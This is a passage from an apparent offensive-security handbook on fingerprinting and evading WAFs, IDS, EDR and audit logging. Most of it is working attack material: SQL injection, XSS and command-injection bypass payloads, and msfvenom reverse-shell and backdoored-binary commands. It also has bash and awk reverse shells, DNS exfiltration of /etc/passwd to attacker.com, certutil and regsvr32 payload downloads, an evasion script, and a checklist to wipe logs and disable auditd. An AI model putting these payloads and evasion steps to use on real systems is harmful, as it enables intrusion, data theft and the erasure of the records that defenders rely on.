- Configuration: `/etc/aide/aide.conf`, `/etc/tripwire/twpol.txt`
- If present, avoid modifying critical system files

### Endpoint Detection and Response (EDR)

**Common EDR Solutions**

**Linux EDR Detection**

```bash
# Check running security agents
ps aux | grep -iE 'falcon|crowdstrike|sentinelone|carbon|cylance|defender'

# Check loaded kernel modules
lsmod | grep -iE 'falcon|security|edr'

# Identify security-related processes
ps aux | grep -iE 'av|antivirus|defense|security|monitor'

# Check for common EDR directories
ls -la /opt/ | grep -iE 'crowdstrike|sentinelone|carbon|qualys'
ls -la /lib/modules/$(uname -r)/kernel/ | grep -i security
```

**Windows EDR Detection**

```powershell
# List security-related services
Get-Service | Where-Object {$_.DisplayName -match 'Defender|Antivirus|Security|Crowdstrike|Sentinel'}

# Check running processes
Get-Process | Where-Object {$_.ProcessName -match 'MsSense|SentinelAgent|CsFalcon|Cb'}

# Identify security products via WMI
Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct
Get-WmiObject -Namespace root\SecurityCenter2 -Class FirewallProduct

# Check Windows Defender status
Get-MpComputerStatus
Get-MpPreference
```

**Behavioral Indicators**

- **System call monitoring**: Strace-like hooking of syscalls
- **Process injection detection**: Alerts on memory manipulation
- **Command-line logging**: All executed commands captured
- **Network connection monitoring**: All outbound connections tracked

### Web Application Firewalls (WAF)

**WAF Identification Techniques**

**HTTP Header Analysis**

```bash
# Send test request and examine headers
curl -I http://target.com

# Common WAF headers:
# Server: cloudflare
# X-CDN: Imperva
# X-Sucuri-ID: 
# X-Azure-Ref:
```

**Tool-Based Detection**

```bash
# wafw00f - WAF fingerprinting tool
wafw00f http://target.com

# Example output:
# [*] The site http://target.com is behind ModSecurity (Trustwave)

# Manual fingerprinting
curl -H "User-Agent: ' OR 1=1--" http://target.com -v 2>&1 | grep -iE 'server|x-|blocked'
```

**Behavioral Testing**

```bash
# Test for WAF with known malicious patterns
curl "http://target.com/test.php?id=1' OR '1'='1" -v

# Observe responses:
# - 403 Forbidden = WAF block
# - Custom error pages = WAF detection
# - Delayed response then block = Analysis + block

# ModSecurity detection
curl "http://target.com/?test=<script>alert(1)</script>" -v 2>&1 | grep "Mod_Security"

# Cloudflare detection
curl -I http://target.com | grep -i cloudflare
```

**Common WAF Signatures**

- **Cloudflare**: `Server: cloudflare`, custom error pages with CF branding
- **AWS WAF**: `X-Amzn-RequestId`, `X-Amzn-Trace-Id` headers
- **ModSecurity**: `Mod_Security` or `NOYB` in headers/errors
- **Imperva Incapsula**: `X-CDN: Incapsula`, `Set-Cookie: visid_incap_`
- **Akamai**: `X-Akamai-Request-ID`, `Akamai-Cache-Status`

### System Monitoring Tools

**Auditd (Linux Audit Framework)**

```bash
# Check if auditd is running
systemctl status auditd
ps aux | grep auditd

# View audit rules
auditctl -l

# Common monitored events:
# - File access: -w /etc/passwd -p wa
# - System calls: -a always,exit -S execve
# - Network connections: -a exit,always -F arch=b64 -S socket

# Check audit logs
ausearch -m execve  # Command executions
ausearch -k web_app_changes  # Custom key searches
```

**Process Accounting (psacct/acct)**

```bash
# Check if enabled
ps aux | grep acct
which lastcomm

# View command history
lastcomm
lastcomm --user root
```

**Sysdig/Falco (Container Security)**

```bash
# Check for Falco
ps aux | grep falco
systemctl status falco

# Falco rules
cat /etc/falco/falco_rules.yaml

# [Inference] Primarily used in containerized environments
# Monitors syscalls, file access, network activity
```

### Application Performance Monitoring (APM)

**Detection Methods**

```bash
# Check for APM agents in web application
grep -r "newrelic\|datadog\|appdynamics\|dynatrace" /var/www/html/

# Environment variables
env | grep -iE 'newrelic|datadog|apm'

# PHP monitoring
php -m | grep -iE 'newrelic|datadog'
cat /etc/php/*/mods-available/*.ini | grep -iE 'newrelic|datadog'
```

**Implications**

- APM tools capture detailed application behavior
- [Inference] Unusual patterns (errors, slow queries, exceptions) may trigger alerts
- Request/response bodies often logged

### Database Activity Monitoring (DAM)

**Identification**

```bash
# Check for proxy-based DAM
netstat -tulnp | grep mysql  # Look for non-standard ports/IPs

# Oracle: Check for audit policies
# (Requires database access)
SELECT * FROM dba_audit_policies;

# MySQL: Check general log status
mysql -e "SHOW VARIABLES LIKE 'general_log%';"

# PostgreSQL: Check logging configuration
psql -c "SHOW log_statement;"
```

**Indicators**

- Database connections through proxy instead of direct
- Query logging enabled
- Audit tables in database schema

### Detection Summary Reference

|Detection Type|Key Indicators|Configuration Files|Active Processes|
|---|---|---|---|
|**Network IDS**|Snort/Suricata rules|`/etc/snort/rules/`, `/etc/suricata/suricata.yaml`|`snort`, `suricata`|
|**Host IDS**|OSSEC/Wazuh agents|`/var/ossec/etc/ossec.conf`|`ossec-*`, `wazuh-agent`|
|**EDR**|Security agents|`/opt/crowdstrike/`, `/opt/sentinelone/`|`falcon-sensor`, `sentinelagent`|
|**WAF**|HTTP headers, blocks|Cloud/proxy configs|N/A (proxy-based)|
|**Audit**|auditd rules|`/etc/audit/rules.d/*.rules`|`auditd`|
|**FIM**|AIDE/Tripwire DBs|`/etc/aide/aide.conf`, `/etc/tripwire/`|Scheduled via cron|

---

## Intrusion Detection Evasion

### Traffic Obfuscation Techniques

**Protocol-Level Evasion**

**HTTP Request Smuggling Basics**

```bash
# Content-Length vs Transfer-Encoding discrepancy
# (Evades some WAF/IDS that parse differently than backend)

# CL.TE vulnerability exploitation
curl -X POST http://target.com \
  -H "Content-Length: 4" \
  -H "Transfer-Encoding: chunked" \
  -d "1
malicious_payload
0

"
```

**Case Variation & Encoding**

```bash
# Mixed case to evade simple string matching
# Instead of: <script>alert(1)</script>
curl "http://target.com/?xss=<ScRiPt>alert(1)</ScRiPt>"

# URL encoding variations
curl "http://target.com/?sql=1%27%20OR%20%271%27%3D%271"  # Basic encoding
curl "http://target.com/?sql=1%2527%2520OR%2520%25271%2527%253D%25271"  # Double encoding

# Unicode encoding
curl "http://target.com/?xss=%u003cscript%u003ealert(1)%u003c/script%u003e"

# HTML entity encoding
curl "http://target.com/?xss=&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;"
```

**Fragmentation**

```bash
# TCP fragmentation using fragroute
echo "tcp_seg 8" | fragroute target.com

# IP fragmentation with nmap
nmap -f target.com  # Fragment packets
nmap -mtu 16 target.com  # Specific MTU size

# [Inference] Most modern IDS reassemble fragments,
# but timing-based evasion may still work
```

**Timing-Based Evasion**

```bash
# Slow HTTP attacks to evade rate limiting
slowhttptest -c 1000 -H -g -o slow_headers.txt -i 10 -r 200 -t GET -u http://target.com

# Slow payload delivery
curl http://target.com --limit-rate 100  # 100 bytes/sec

# Time-delayed requests
for i in {1..100}; do
  curl "http://target.com/exploit?param=payload" &
  sleep 0.5  # 500ms delay between requests
done
```

### Signature Evasion

**SQL Injection Evasion**

**Comment-Based Obfuscation**

```sql
-- Instead of: ' OR 1=1--
' /*!50000OR*/ 1=1--  -- MySQL version-specific comment
' /**/OR/**/1=1--     -- Inline comments
' OR--+-             -- Comment tricks
1' O%52 1=1--        -- URL-encoded OR
```

**Alternative Syntax**

```sql
-- Instead of: UNION SELECT
' UniOn SelEcT       -- Case variation
' /*!12345UNION*/ /*!12345SELECT*/  -- Version comments
' %55nion %53elect   -- URL encoding
' union distinct select  -- Additional keywords
' union all select   -- ALL instead of default
```

**Function Equivalents**

```sql
-- Instead of: substring()
substr()             -- Alternative function
mid()                -- MySQL alternative
left()               -- Partial extraction

-- Instead of: concat()
CONCAT_WS()          -- Concat with separator
GROUP_CONCAT()       -- Aggregate function

-- Instead of: sleep(5)
BENCHMARK(5000000,SHA1(1))  -- CPU-based delay
```

**Encoding Techniques**

```sql
-- Hex encoding
' OR 0x61646d696e=0x61646d696e--  -- 'admin'='admin'

-- Char() function
' OR CHAR(97,100,109,105,110)--   -- Constructs 'admin'

-- Binary/ASCII manipulation
' OR ASCII('A')>64--
```

**XSS Evasion**

**Tag Variations**

```html
<!-- Instead of: <script>alert(1)</script> -->
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<iframe src="javascript:alert(1)">
```

**Attribute Breaking**

```html
<!-- Breaking out of attributes -->
"><script>alert(1)</script>
' autofocus onfocus=alert(1) x='
" onmouseover=alert(1) x="
```

**Encoding Chains**

```html
<!-- HTML + JS + URL encoding -->
<svg/onload=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>  <!-- HTML entities -->
<img src=x onerror=\u0061lert(1)>  <!-- Unicode escape -->
<svg><script>eval(atob('YWxlcnQoMSk='))</script></svg>  <!-- Base64 -->
```

**Filter Bypass Strings**

```javascript
// Bypass keyword filters
alert`1`         // Template literal
(alert)(1)       // Function grouping
[]['constructor']['constructor']('alert(1)')()  // Array constructor
top['alert'](1)  // Property access
self['ale'+'rt'](1)  // String concatenation
```

**Command Injection Evasion**

**Command Separators**

```bash
# Instead of: ; ls
| ls           # Pipe
|| ls          # OR
& ls           # Background
&& ls          # AND
`ls`           # Command substitution
$(ls)          # Command substitution (modern)
; ls           # Semicolon separator
%0Als          # Newline separator (URL encoded)
```

**Quote Manipulation**

```bash
# Instead of: cat /etc/passwd
cat /etc/pas'swd
cat /etc/pas"swd"
cat /etc/pas\swd
cat /etc/pa``sswd
cat /etc/$@passwd  # Empty variable expansion
```

**Wildcard Obfuscation**

```bash
# Instead of: cat /etc/passwd
cat /e?c/pass??
cat /e*c/*asswd
cat /etc/pass[w]d
```

**Variable Expansion Tricks**

```bash
# Using environment variables
$PATH -> /usr/local/bin:/usr/bin:/bin
cat ${PATH:0:1}etc${PATH:0:1}passwd  # /etc/passwd

# Empty variables
cat$IFS/etc/passwd  # $IFS = Internal Field Separator (space)
cat${x}/etc/passwd  # $x is undefined/empty
```

**Base64 Encoding**

```bash
# Encode command
echo "cat /etc/passwd" | base64
# Y2F0IC9ldGMvcGFzc3dk

# Execute encoded command
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
`echo Y2F0IC9ldGMvcGFzc3dk | base64 -d`
```

### Traffic Pattern Evasion

**User-Agent Rotation**

```bash
# Randomize User-Agent to avoid fingerprinting
USER_AGENTS=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
)

for i in {1..10}; do
    UA=${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}
    curl -A "$UA" http://target.com/exploit
done
```

**IP Rotation & Proxying**

```bash
# Use proxychains with multiple proxies
# /etc/proxychains.conf:
# strict_chain / dynamic_chain
# proxy_dns
# [ProxyList]
# socks5 127.0.0.1 9050

proxychains curl http://target.com/exploit

# Tor network
systemctl start tor
proxychains -f /etc/proxychains.conf sqlmap -u "http://target.com/?id=1"

# Multiple HTTP proxies rotation
for proxy in "http://proxy1:8080" "http://proxy2:3128" "http://proxy3:8888"; do
    curl -x "$proxy" http://target.com/exploit
done
```

**Referer Manipulation**

```bash
# Bypass Referer-based restrictions
curl -H "Referer: http://target.com/admin/" http://target.com/admin/sensitive.php

# Empty referer
curl -H "Referer:" http://target.com/

# Same-origin referer
curl -H "Referer: http://target.com/" http://target.com/exploit
```

**Request Spacing**

```bash
# Evade rate limiting with random delays
for i in {1..100}; do
    curl http://target.com/exploit?param=payload
    sleep $(( RANDOM % 5 + 1 ))  # Random 1-5 second delay
done
```

### Protocol-Specific Evasion

**DNS Tunneling**

```bash
# Exfiltrate data via DNS queries
# Setup: External DNS server logs queries

# Encode data in subdomain
DATA=$(echo "sensitive_data" | base64)
dig ${DATA}.attacker.com

# Use dnscat2 for full tunnel
# Server:
dnscat2 attacker.com

# Client:
./dnscat --dns server=attacker.com
```

**ICMP Tunneling**

```bash
# Use ptunnel for ICMP tunnel
# Server:
ptunnel -x password

# Client:
ptunnel -p target.com -lp 8000 -da internal-host.com -dp 22 -x password

# Now SSH via localhost:8000 tunneled through ICMP
ssh -p 8000 localhost
```

**HTTP/2 Smuggling** [Inference] HTTP/2-specific smuggling techniques can bypass WAF/IDS that don't fully parse HTTP/2:

```bash
# Using h2c (HTTP/2 over cleartext)
# Requires specialized tools like h2csmuggler

# Conceptual approach:
# - Send HTTP/2 request with malformed headers
# - Downgrade to HTTP/1.1 mid-stream
# - Backend interprets differently than frontend
```

### Payload Encoding Strategies

**Multi-Layer Encoding**

```bash
# Triple encoding example
ORIGINAL="' OR 1=1--"
ENCODED1=$(echo -n "$ORIGINAL" | xxd -p)  # Hex
ENCODED2=$(echo -n "$ENCODED1" | base64)  # Base64
ENCODED3=$(echo -n "$ENCODED2" | base64)  # Base64 again

# Server-side decoding required for each layer
```

**Character Set Manipulation**

```bash
# UTF-7 encoding (older IIS)
curl -H "Content-Type: text/html; charset=UTF-7" \
     -d "+ADw-script+AD4-alert(1)+ADw-/script+AD4-" \
     http://target.com/

# UTF-16 encoding
echo -n '<script>alert(1)</script>' | iconv -f UTF-8 -t UTF-16LE | xxd -p
```

### Encrypted/Obfuscated Channels

**SSL/TLS Tunneling**

```bash
# Stunnel for encrypting traffic
# stunnel.conf:
# [https]
# client = yes
# accept = 127.0.0.1:8080
# connect = target.com:443

stunnel stunnel.conf
curl http://localhost:8080/exploit  # Traffic encrypted via stunnel
```

**Custom Protocols** [Inference] Writing custom binary protocols can evade signature-based detection:

```python
# Simple custom protocol wrapper
import socket
import struct

def send_obfuscated(host, port, data):
    sock = socket.socket()
    sock.connect((host, port))
    
    # Custom header + XOR obfuscation
    header = struct.pack('!I', len(data))
    obfuscated = bytes([b ^ 0xAA for b in data.encode()])
    
    sock.send(header + obfuscated)
    sock.close()
```

### Tool-Specific Evasion

**Sqlmap IDS Evasion**

```bash
# Tamper scripts (encoding/obfuscation)
sqlmap -u "http://target.com/?id=1" --tamper=space2comment,between,randomcase

# Available tampers:
# - space2comment: Replace spaces with comments
# - between: Replace > with BETWEEN
# - randomcase: Random case variation
# - charencode: URL encode characters

# Random User-Agent
sqlmap -u "http://target.com/?id=1" --random-agent

# Delay between requests
sqlmap -u "http://target.com/?id=1" --delay=2

# Multiple tamper scripts
sqlmap -u "http://target.com/?id=1" --tamper=space2comment,between,versionedkeywords
```

**Nmap Stealth Scanning**

```bash
# SYN stealth scan (no full TCP handshake)
nmap -sS target.com

# FIN/NULL/Xmas scans (bypass stateless firewalls)
nmap -sF target.com  # FIN scan
nmap -sN target.com  # NULL scan
nmap -sX target.com  # Xmas scan

# Decoy scanning (hide among fake sources)
nmap -D RND:10 target.com  # 10 random decoys

# Slow scan timing
nmap -T0 target.com  # Paranoid (wait 5min between probes)
nmap -T1 target.com  # Sneaky (wait 15sec between probes)

# Fragmentation
nmap -f target.com
```

**Metasploit Evasion**

```bash
# Encoder selection
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x64/xor_dynamic -i 10 -f elf -o payload.elf

# Multiple encoding iterations

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 15 -f exe -o payload.exe

# Available encoders:

# - x86/shikata_ga_nai: Polymorphic XOR additive feedback encoder

# - x64/xor_dynamic: Dynamic XOR encoder

# - cmd/powershell_base64: Base64 encoding for PowerShell

# Template injection (embed in legitimate binary)

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -x /path/to/legitimate.exe -k -f exe -o backdoored.exe

# Within Metasploit console

msf6 > use exploit/multi/handler 
msf6 exploit(handler) > set payload linux/x64/meterpreter/reverse_tcp 
msf6 exploit(handler) > set LHOST 192.168.1.100 
msf6 exploit(handler) > set LPORT 4444 
msf6 exploit(handler) > set EnableStageEncoding true 
msf6 exploit(handler) > set StageEncoder x64/xor_dynamic 
msf6 exploit(handler) > exploit
```

**Burp Suite Evasion Extensions**
```

Extensions for evasion:

- Bypass WAF: Automatic encoding/obfuscation
- WAF Bypass: Multiple evasion techniques
- Turbo Intruder: Rate limit bypass with custom Python
- Random IP Address: Rotate X-Forwarded-For headers

````

### Behavioral Evasion

**Mimicking Legitimate Traffic**

**Session Establishment**
```bash
# Establish session like normal user before exploit
curl -c cookies.txt http://target.com/login -d "user=test&pass=test"
curl -b cookies.txt http://target.com/profile
curl -b cookies.txt http://target.com/settings
# ... then exploit
curl -b cookies.txt http://target.com/vulnerable?exploit=payload
````

**Referrer Chain**

```bash
# Build believable navigation path
curl -H "Referer: https://google.com/search?q=target+site" http://target.com/
sleep 2
curl -H "Referer: http://target.com/" http://target.com/products
sleep 3
curl -H "Referer: http://target.com/products" http://target.com/vulnerable?id=1'
```

**Time-of-Day Attacks**

```bash
# Schedule attacks during high-traffic periods (blend in)
# Example: Attack during business hours
HOUR=$(date +%H)
if [ $HOUR -ge 9 ] && [ $HOUR -le 17 ]; then
    ./exploit.sh
else
    echo "Waiting for business hours..."
fi
```

### Living Off The Land (LOLBins/LOLBas)

**Linux LOLBins for Evasion**

```bash
# Using built-in tools to avoid detection

# File download without wget/curl
/usr/bin/python3 -c 'import urllib.request; urllib.request.urlretrieve("http://attacker.com/payload", "/tmp/p")'

# Or using built-in tools
/usr/bin/scp attacker@attacker.com:/payload /tmp/payload

# Reverse shell without nc
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

# Using awk for networking
awk 'BEGIN {s = "/inet/tcp/0/192.168.1.100/4444"; while(1) {do {s |& getline c} while(c != ""); if(c) {while ((c |& getline) > 0) print $0; close(c)}}}}'

# File exfiltration via DNS
xxd -p /etc/passwd | while read line; do dig $line.attacker.com; done
```

**Windows LOLBas**

```powershell
# Download file using certutil
certutil.exe -urlcache -split -f http://attacker.com/payload.exe C:\temp\payload.exe

# Using bitsadmin
bitsadmin /transfer myDownloadJob /download /priority normal http://attacker.com/payload.exe C:\temp\payload.exe

# PowerShell download without Invoke-WebRequest
(New-Object System.Net.WebClient).DownloadFile("http://attacker.com/payload.exe", "C:\temp\payload.exe")

# Execution via mshta (bypasses some restrictions)
mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd /c calc.exe"":close")

# Regsvr32 for remote execution
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
```

### Evading Specific Detection Technologies

**Web Application Firewall Bypass Compilation**

**ModSecurity Evasion**

```bash
# Bypass SecRule ID 981173 (SQL keywords)
# Instead of: SELECT * FROM users
SeLeCt/**/*/**/FrOm/**/users

# Bypass using MySQL comments
/*!50000SELECT*/ * FROM users

# Bypass using character encoding
%53%45%4C%45%43%54%20%2A%20%46%52%4F%4D%20users

# Bypass using NULL bytes (older versions)
SEL%00ECT * FROM users
```

**Cloudflare WAF Evasion**

```bash
# Origin IP discovery (bypass Cloudflare entirely)
# Check DNS history
# - SecurityTrails
# - CrimeFlare database
# Check subdomain records
dig @8.8.8.8 target.com ANY

# Mail server exposure
dig @8.8.8.8 target.com MX
# Then probe mail server for origin IP

# Rate limiting bypass with Origin header
curl -H "Origin: https://target.com" http://target.com/exploit

# Using IPv6 if available
curl -6 http://[2001:db8::1]/exploit

# [Inference] Some Cloudflare configurations don't protect IPv6
```

**AWS WAF Evasion**

```bash
# Header manipulation
curl -H "X-Forwarded-For: 127.0.0.1" http://target.com/admin

# Method override
curl -X POST -H "X-HTTP-Method-Override: GET" http://target.com/api/delete

# Content-Type confusion
curl -H "Content-Type: application/json" -d "xml_payload" http://target.com/api
```

### Advanced IDS/IPS Evasion

**Snort-Specific Evasion**

**Preprocessor Evasion**

```bash
# Stream5 reassembly evasion
# Send overlapping TCP segments with different data
# [Inference] Requires packet crafting tools like Scapy

# HTTP Inspect evasion
# Use abnormal HTTP syntax
curl --http1.0 --request "GET /exploit HTTP/1.0\r\nHost: target.com\r\n\r\n" http://target.com

# Oversize URI (may bypass inspection)
curl "http://target.com/$(python3 -c 'print("A"*8192)')?exploit=payload"
```

**Rule-Specific Bypasses**

```python
# Scapy for crafting evasive packets
from scapy.all import *

# Fragmented payload
payload = b"GET /exploit HTTP/1.1\r\nHost: target.com\r\n\r\n"
frag1 = IP(dst="target.com")/TCP(dport=80)/Raw(load=payload[:20])
frag2 = IP(dst="target.com")/TCP(dport=80)/Raw(load=payload[20:])

send(frag1)
time.sleep(0.5)
send(frag2)

# TTL manipulation (expire before IDS, reach target)
send(IP(dst="ids.com", ttl=1)/TCP(dport=80)/Raw(load=payload))  # Expires at IDS
send(IP(dst="target.com", ttl=64)/TCP(dport=80)/Raw(load=payload))  # Reaches target
```

**Suricata Evasion**

```bash
# TLS fingerprinting evasion
# Use unusual cipher suites
openssl s_client -cipher 'AES256-SHA' -connect target.com:443

# Protocol anomaly (app layer confusion)
# Send HTTP request over non-standard port
curl --http1.1 http://target.com:8443/exploit
```

### Evasion Testing & Validation

**Testing Detection Coverage**

```bash
# EICAR test string (AV detection test)
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > eicar.txt

# If detected, AV/EDR is active
# If not, try obfuscated version
echo 'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUIJEJ IKg==' | base64 -d > eicar_encoded.txt
```

**IDS/IPS Probe**

```bash
# Send known malicious patterns
curl "http://target.com/?test=../../../../etc/passwd"
curl "http://target.com/?test=<script>alert(document.cookie)</script>"
curl "http://target.com/?test=' OR '1'='1"

# Observe responses:
# - Immediate block = Inline IPS
# - Delayed block = Analysis then block
# - No block = No detection or rule gap
```

**Log Monitoring Detection**

```bash
# Check if requests appear in logs immediately
curl http://target.com/unique_test_string_12345

# SSH to target and check logs
ssh target.com
tail -f /var/log/apache2/access.log | grep unique_test_string_12345

# If immediate appearance = Real-time logging
# If delayed = Batch logging (easier to evade)
```

### Evasion Automation

**Custom Evasion Script Template**

```python
#!/usr/bin/env python3
import requests
import random
import time
import base64
from urllib.parse import quote

class IdsEvasion:
    def __init__(self, target_url):
        self.target = target_url
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ]
    
    def random_ua(self):
        return random.choice(self.user_agents)
    
    def encode_payload(self, payload, method='url'):
        """Multiple encoding strategies"""
        if method == 'url':
            return quote(payload)
        elif method == 'double_url':
            return quote(quote(payload))
        elif method == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif method == 'hex':
            return '0x' + payload.encode().hex()
        return payload
    
    def obfuscate_sql(self, sql):
        """SQL injection obfuscation"""
        # Random case
        result = ''.join(random.choice([c.upper(), c.lower()]) for c in sql)
        # Add comments
        result = result.replace(' ', '/**/')
        return result
    
    def send_evasive_request(self, payload, delay=True):
        headers = {
            'User-Agent': self.random_ua(),
            'Referer': self.target,
            'X-Forwarded-For': f"192.168.{random.randint(1,254)}.{random.randint(1,254)}"
        }
        
        try:
            response = requests.get(
                f"{self.target}?param={payload}",
                headers=headers,
                timeout=10
            )
            
            if delay:
                time.sleep(random.uniform(1, 5))
            
            return response
        except Exception as e:
            print(f"[!] Error: {e}")
            return None
    
    def test_evasion(self, base_payload):
        """Test multiple evasion techniques"""
        techniques = ['url', 'double_url', 'base64', 'hex']
        
        for technique in techniques:
            encoded = self.encode_payload(base_payload, technique)
            print(f"[*] Testing {technique} encoding...")
            response = self.send_evasive_request(encoded)
            
            if response and response.status_code == 200:
                print(f"[+] {technique} encoding successful!")
                return technique
        
        return None

# Usage example
if __name__ == "__main__":
    evader = IdsEvasion("http://target.com/vulnerable")
    
    # SQL injection payload
    sql_payload = "' OR 1=1--"
    obfuscated_sql = evader.obfuscate_sql(sql_payload)
    
    print(f"[*] Original: {sql_payload}")
    print(f"[*] Obfuscated: {obfuscated_sql}")
    
    # Test evasion
    successful_technique = evader.test_evasion(obfuscated_sql)
    if successful_technique:
        print(f"[+] Best evasion technique: {successful_technique}")
```

### Evasion Checklists

**Pre-Exploitation Detection Check**

```
[ ] Identify WAF/IDS/IPS (wafw00f, manual testing)
[ ] Check for EDR agents (process list, kernel modules)
[ ] Verify logging mechanisms (auditd, syslog, application logs)
[ ] Test rate limiting (burst requests, observe blocks)
[ ] Identify monitored parameters (test different inputs)
[ ] Check SSL/TLS inspection (certificate analysis)
[ ] Verify IP-based restrictions (proxy rotation test)
```

**Evasion Implementation**

```
[ ] Select appropriate encoding (URL, base64, hex, unicode)
[ ] Implement case variation (randomcase, mixed)
[ ] Add obfuscation (comments, concatenation, whitespace)
[ ] Configure request timing (delays, randomization)
[ ] Rotate identifiers (User-Agent, Referer, X-Forwarded-For)
[ ] Fragment payloads (if supported)
[ ] Test bypass effectiveness (incremental payload testing)
```

**Post-Exploitation Evasion**

```
[ ] Clean logs immediately (auth.log, access.log, syslog)
[ ] Use in-memory operations (avoid disk writes)
[ ] Disable/modify monitoring (auditd, rsyslog)
[ ] Maintain legitimate appearance (mimic normal traffic)
[ ] Use encrypted channels (TLS, custom encryption)
[ ] Rotate C2 infrastructure (change IPs, domains)
[ ] Clean artifacts (history, temporary files, processes)
```

### Common Evasion Pitfalls

**[Inference] What NOT to do:**

- **Don't reuse identical payloads repeatedly** - Pattern recognition will flag
- **Avoid sudden traffic spikes** - Rate limiting will trigger
- **Don't ignore timing patterns** - Consistent intervals are suspicious
- **Never leave original logs** - Always clean or disable logging
- **Don't assume encoding is sufficient** - Modern systems decode multiple layers
- **Avoid using known tool signatures** - Modify or obfuscate tool traffic
- **Don't forget about DNS logs** - Domain queries are often logged separately
- **Never trust single evasion technique** - Layer multiple techniques

### Detection vs. Evasion Trade-offs

|Detection Mechanism|Evasion Difficulty|Recommended Technique|
|---|---|---|
|**Signature-based IDS**|Low|Encoding, obfuscation, polymorphism|
|**Behavioral IDS**|Medium|Mimic legitimate traffic, slow rate|
|**ML-based EDR**|High|LOLBins, legitimate tool abuse|
|**WAF**|Low-Medium|Encoding, protocol smuggling|
|**Human SOC Analyst**|Very High|Blend in, operate during busy hours|
|**File Integrity Monitoring**|Medium|In-memory operations, timestamp manipulation|
|**Network Flow Analysis**|Medium|Encrypt traffic, use common protocols|
|**Endpoint Logging**|Low|Disable logging, clean immediately|

---

## Related Topics

- **Advanced Persistence Techniques** - Maintaining access while evading detection
- **Post-Exploitation Data Exfiltration** - Covert channels and encoding for data theft
- **Container & Kubernetes Security** - Detection/evasion in containerized environments
- **Cloud Security & Detection** - AWS GuardDuty, Azure Sentinel, GCP Security Command Center evasion

---

# Defense & Detection Avoidance

## WAF Fingerprinting and Bypass

### WAF Fingerprinting Techniques

**Identification Methods:**

WAF fingerprinting reveals the type and configuration of web application firewalls protecting a target. This information guides bypass strategy selection.

**Using wafw00f:**

```bash
wafw00f https://target.com
wafw00f -a https://target.com  # Aggressive mode, tests all detection methods
wafw00f -l  # List all detectable WAFs
```

**Manual fingerprinting via HTTP headers:**

```bash
curl -I https://target.com
# Look for headers like: Server, X-CDN, X-Protected-By, X-Sucuri-ID

curl -v https://target.com 2>&1 | grep -i "server\|cdn\|firewall"
```

**Response analysis:**

```bash
# Send malicious payload to trigger WAF
curl "https://target.com/?id=1' OR '1'='1" -v

# Examine blocking page, status codes (403, 406, 501)
# Check Set-Cookie headers for WAF-specific cookies
```

**Using nmap NSE scripts:**

```bash
nmap -p80,443 --script http-waf-detect,http-waf-fingerprint target.com
```

### WAF Bypass Techniques

**Case manipulation:**

```bash
# Standard payload
' OR 1=1--

# Case variations
' oR 1=1--
' Or 1=1--
' OR 1=1--
```

**Encoding bypasses:**

URL encoding:

```bash
# Single encoding
%27%20OR%201=1--

# Double encoding
%2527%2520OR%25201=1--

# Unicode encoding
\u0027 OR 1=1--
```

HTML entity encoding:

```bash
&#39; OR 1=1--
&#x27; OR 1=1--
```

**Comment insertion:**

```bash
# MySQL
'/**/OR/**/1=1--
'/*!OR*/1=1--

# MSSQL
'--+%0aOR 1=1--

# Oracle
'||--comment%0aOR 1=1--
```

**String concatenation:**

```bash
# MySQL
' OR 'a'='a
CONCAT('ad','min')

# MSSQL
'+'OR'+'a'='a
'ad'+'min'

# Oracle
'||'a'='a'
'ad'||'min'

# PostgreSQL
'||'a'='a'
'ad'||'min'
```

**Whitespace alternatives:**

```bash
# Tab
'%09OR%091=1--

# Newline
'%0aOR%0a1=1--

# Carriage return
'%0dOR%0d1=1--

# Multiple spaces
'%20%20OR%20%201=1--

# Block comments (MySQL)
'/**/OR/**/1=1--
```

**HTTP Parameter Pollution (HPP):**

```bash
# Splitting payload across multiple parameters
?id=1&id=' OR 1=1--

# Using different parameter names
?id=1&ID=' OR 1=1--

# Array-style parameters
?id[]=1&id[]=' OR 1=1--
```

**HTTP verb tampering:**

```bash
# If GET is blocked, try POST
curl -X POST "https://target.com/api" -d "id=1' OR 1=1--"

# Try other verbs
curl -X PUT "https://target.com/api" -d "id=1' OR 1=1--"
curl -X PATCH "https://target.com/api" -d "id=1' OR 1=1--"
```

**Content-Type manipulation:**

```bash
# Standard request blocked
curl -X POST -d "id=1' OR 1=1--" https://target.com

# Try JSON
curl -X POST -H "Content-Type: application/json" \
  -d '{"id":"1' OR 1=1--"}' https://target.com

# Try XML
curl -X POST -H "Content-Type: application/xml" \
  -d '<id>1' OR 1=1--</id>' https://target.com
```

**Using alternative keywords:**

```bash
# Instead of UNION
UNION -> %55nion -> %55NI%4fN
UNION ALL -> UNION DISTINCT -> UNION ALL SELECT

# Instead of SELECT
SELECT -> %53elect -> SELSELECTECT

# Instead of AND/OR
AND -> && -> %26%26
OR -> || -> %7c%7c
```

**Null byte injection:**

```bash
# Append null byte to bypass signature matching
%00' OR 1=1--
